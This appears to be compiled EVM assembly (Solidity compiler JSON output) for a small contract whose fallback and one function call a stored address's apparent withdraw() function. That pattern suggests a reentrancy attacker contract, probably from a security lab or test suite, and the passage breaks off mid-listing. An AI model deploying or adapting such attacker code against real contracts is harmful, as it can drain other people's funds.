									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 115,
									"end": 180,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 115,
									"end": 180,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 187,
									"end": 239,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 187,
									"end": 239,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 187,
									"end": 239,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 187,
									"end": 239,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 221,
									"end": 231,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 213,
									"end": 218,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 213,
									"end": 218,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 213,
									"end": 231,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 213,
									"end": 231,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 213,
									"end": 231,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 213,
									"end": 231,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 57,
									"end": 584,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 57,
									"end": 584,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212208f4ba91fe955d6f69bd8e42f870757785d4005dc063b4bd7ca20415b67bb532464736f6c63430008020033",
									".code": [
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "41C0E1B5"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "A3FDFEE3"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH",
											"source": 0,
											"value": "F787E039"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 57,
											"end": 584,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 565,
											"end": 571,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 565,
											"end": 569,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 565,
											"end": 571,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 565,
											"end": 571,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 565,
											"end": 571,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 57,
											"end": 584,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 328,
											"end": 409,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "tag",
											"source": 0,
											"value": "21"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 451,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 451,
											"end": 456,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 451,
											"end": 456,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 451,
											"end": 456,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 451,
											"end": 456,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 451,
											"end": 461,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 451,
											"end": 461,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 466,
											"end": 473,
											"name": "PUSH",
											"source": 0,
											"value": "788B60"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "3CCFD60B00000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 475,
											"end": 512,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 451,
											"end": 513,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 451,
											"end": 513,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 417,
											"end": 521,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 328,
											"end": 409,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 296,
											"end": 301,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 296,
											"end": 301,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
